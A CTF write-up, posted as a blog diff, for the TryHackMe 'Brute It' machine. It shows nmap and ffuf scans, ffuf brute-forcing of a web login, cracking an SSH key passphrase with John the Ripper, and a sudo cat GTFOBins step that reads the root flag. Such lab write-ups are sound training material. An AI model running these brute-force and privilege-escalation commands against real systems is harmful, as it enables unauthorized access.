@@ -1,0 +1,287 @@
+---
+title: "TryHackMe Writeup: Brute It"
+author: Guru Brian
+pubDatetime: 2026-08-03T07:31:14.159Z
+slug: 
+featured: false
+tags:
+  - Brute It
+  - TryHackMe
+  - Privilege Escalation
+  - CTF
+description: A complete writeup for the TryHackMe Brute It CTF, featuring directory fuzzing, web login brute-forcing, and leveraging GTFOBins for root privilege escalation.
+hideEditPost: false
+---
+
+A comprehensive guide to solving the Brute It CTF on TryHackMe. This writeup explains directory enumeration, web brute-forcing, cracking RSA keys, and escalating privileges to root.
+
+## Table of contents
+
+## Initial Reconnaissance
+
+As with any machine, we start by scanning the target to see what ports and services are exposed using nmap.
+
+```bash
+❯ nmap -p- -sC -sV -vv -T5 -Pn 10.10.138.181
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 08:06 EDT
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:06
+Completed NSE at 08:06, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:06
+Completed NSE at 08:06, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:06
+Completed NSE at 08:06, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 08:06
+Completed Parallel DNS resolution of 1 host. at 08:06, 0.00s elapsed
+Initiating SYN Stealth Scan at 08:06
+Scanning 10.10.138.181 [65535 ports]
+Discovered open port 22/tcp on 10.10.138.181
+Discovered open port 80/tcp on 10.10.138.181
+Increasing send delay for 10.10.138.181 from 0 to 5 due to 21 out of 52 dropped probes since last increase.
+Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 8.56% done; ETC: 08:08 (0:01:36 remaining)
+Warning: 10.10.138.181 giving up on port because retransmission cap hit (2).
+SYN Stealth Scan Timing: About 12.22% done; ETC: 08:12 (0:04:40 remaining)
+SYN Stealth Scan Timing: About 16.28% done; ETC: 08:13 (0:05:55 remaining)
+SYN Stealth Scan Timing: About 19.91% done; ETC: 08:15 (0:06:38 remaining)
+SYN Stealth Scan Timing: About 23.09% done; ETC: 08:16 (0:07:10 remaining)
+SYN Stealth Scan Timing: About 41.23% done; ETC: 08:18 (0:06:42 remaining)
+SYN Stealth Scan Timing: About 47.99% done; ETC: 08:18 (0:06:07 remaining)
+SYN Stealth Scan Timing: About 53.38% done; ETC: 08:18 (0:05:22 remaining)
+SYN Stealth Scan Timing: About 58.49% done; ETC: 08:18 (0:04:47 remaining)
+SYN Stealth Scan Timing: About 63.54% done; ETC: 08:18 (0:04:11 remaining)
+SYN Stealth Scan Timing: About 68.90% done; ETC: 08:18 (0:03:35 remaining)
+SYN Stealth Scan Timing: About 74.30% done; ETC: 08:18 (0:02:59 remaining)
+SYN Stealth Scan Timing: About 79.33% done; ETC: 08:18 (0:02:24 remaining)
+SYN Stealth Scan Timing: About 84.82% done; ETC: 08:18 (0:01:45 remaining)
+SYN Stealth Scan Timing: About 89.97% done; ETC: 08:18 (0:01:10 remaining)
+SYN Stealth Scan Timing: About 94.90% done; ETC: 08:18 (0:00:35 remaining)
+Completed SYN Stealth Scan at 08:18, 716.63s elapsed (65535 total ports)
+Initiating Service scan at 08:18
+Scanning 2 services on 10.10.138.181
+Completed Service scan at 08:18, 6.37s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.138.181.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:18
+Completed NSE at 08:18, 6.05s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:18
+Completed NSE at 08:19, 0.76s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:19
+Completed NSE at 08:19, 0.00s elapsed
+Nmap scan report for 10.10.138.181
+Host is up, received user-set (0.16s latency).
+Scanned at 2025-08-12 08:06:50 EDT for 730s
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE    SERVICE REASON         VERSION
+22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
+|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
+80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+30097/tcp filtered unknown no-response
+41018/tcp filtered unknown no-response
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:19
+Completed NSE at 08:19, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:19
+Completed NSE at 08:19, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:19
+Completed NSE at 08:19, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 730.12 seconds
+           Raw packets sent: 73212 (3.221MB) | Rcvd: 73091 (3.224MB)
+```
+The scan reveals two open ports:
+
+- Port 22: SSH
+
+- Port 80: HTTP (Apache web server)
+
+## Web Enumeration & Directory Fuzzing
+
+Since we have a web server running on port 80 displaying the default Apache page, let's fuzz for hidden directories using ffuf and the SecLists combined_directories wordlist.
+
+```bash
+❯ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -u http://10.10.138.181/FUZZ
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.138.181/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 4696ms]
+:: Progress: [1355/1377725] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:13] :: Errors: 0 ::^[WARN] Caught keyboard interrupt (Ctrl-C)
+```
+Excellent. We found an /admin directory.
+
+## Web Login Brute-Forcing
+
+Navigating to [http://10.10.138.181/admin/](http://10.10.138.181/admin/) presents us with a login page. By inspecting the page source, we find a hint revealing that the username is admin.
+
+Now that we have the username, we can use ffuf again to brute-force the password via a POST request. We will filter for a 302 redirect status code, which indicates a successful login.
+
+```bash
+❯ ffuf -u http://10.10.138.181/admin/ -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt  -mc 302
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.138.181/admin/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : user=admin&pass=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 302
+________________________________________________
+
+xavier                  [Status: 302, Size: 671, Words: 159, Lines: 29, Duration: 159ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+```
+> \[!WARNING]
+> ***Pay Attention to Trailing Slashes:***
+>
+> When fuzzing directories, pay close attention to your target URL format. If you run the command above without the trailing slash on /admin (i.e., [http://10.10.138.181/admin](http://10.10.138.181/admin)), it will not return any results.
+
+> \[!NOTE]
+> ***Why does the trailing slash matter?*** 
+> 
+> Without the trailing slash, ffuf interprets /admin as a specific file rather than a directory. Since there is no file named "admin", the brute-force attack fails to interact with the login form correctly. Always ensure you are pointing to the correct path structure!
+
+## Cracking the SSH Key
+
+Logging into the admin dashboard with our newly found credentials (admin:xavier), we are greeted with an RSA private key belonging to the user john.
+
+We save this key to our local machine as john.rsa and modify its permissions so SSH will accept it (chmod 600 john.rsa). However, the key is encrypted with a passphrase. We need to crack it.
+
+First, we use ssh2john to convert the key into a format John the Ripper can understand:
+
+```bash
+❯ ssh2john john.rsa > johntocrack
+```
+
+Next, we crack the hash using the rockyou.txt wordlist:
+
+```bash
+❯  john johntocrack -wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rockinroll       (john.rsa)
+1g 0:00:00:00 DONE (2025-08-12 07:55) 33.33g/s 2423Kp/s 2423Kc/s 2423KC/s saloni..pooppy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+John successfully cracks the passphrase: rockinroll.
+
+## System Access & Privilege Escalation
+With the private key and its passphrase in hand, we can SSH into the machine as john.
+
+```bash
+❯ ssh -i john.rsa john@10.10.138.181
+Enter passphrase for key 'john.rsa':
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug 12 11:55:48 UTC 2025
+
+  System load:  0.16               Processes:           109
+  Usage of /:   25.8% of 19.56GB   Users logged in:     0
+  Memory usage: 23%                IP address for ens5: 10.10.138.181
+  Swap usage:   0%
+
+
+63 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
+john@bruteit:~$
+```
+Once inside, the first step of privilege escalation is checking what we can run as the superuser.
+
+```bash
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+```
+
+We can run the /bin/cat command as root without a password!
+
+A quick check on GTFOBins (a curated list of Unix binaries that can be exploited to bypass local security restrictions) tells us exactly how to weaponize this: If the binary is allowed to run as superuser by sudo, it does not drop elevated privileges and can be used to access the file system.
+
+> \[!TIP]+ Mentor's tip
+> ***Sudo***:
+>
+> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+>
+> **LFILE**=file_to_read
+>
+> *sudo cat "$LFILE"*
+
+Let's read the root flag:
+
+```bash
+john@bruteit:~$ LFILE=/root/root.txt
+john@bruteit:~$ sudo cat "$LFILE"
+THM{pr1v1l3g3_#########}
+```
+
+> \[!SUCCESS]
+> Easy! We have successfully compromised the machine and escalated our privileges to root.
